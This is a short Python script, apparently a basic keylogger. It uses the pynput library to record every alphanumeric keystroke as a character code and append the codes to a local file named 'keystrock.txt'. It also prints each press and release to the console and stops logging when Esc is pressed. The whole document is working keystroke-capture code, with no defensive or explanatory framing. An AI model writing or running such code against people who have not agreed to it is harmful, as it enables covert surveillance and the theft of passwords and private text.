import os
from pynput import keyboard

keys = []
# make sure your terminal running where the main.py is placed.
cwd = os.path.join(os.getcwd(),'keystrock.txt')

def on_press(key):
    try:
        print("alphanumeric key {0} pressed".format(key.char))
        keys.append(str(ord(key.char)))
        if len(keys) == 10:
            with open(cwd,'a') as f:
                f.write(" ".join(keys) + " ")
            keys.clear()
    except AttributeError:
        if key == keyboard.Key.enter:
            with open(cwd, 'a') as f:
                f.write('\n')
        print("special key {0} pressed".format(key))


def on_release(key):
    print("{0} released".format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        if len(keys) > 0:
            with open(cwd, 'a') as f:
                f.write(' '.join(keys) + ' ')
        return False


# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
# listener = keyboard.Listener(on_press=on_press, on_release=on_release)
# listener.start()
# print(keys)
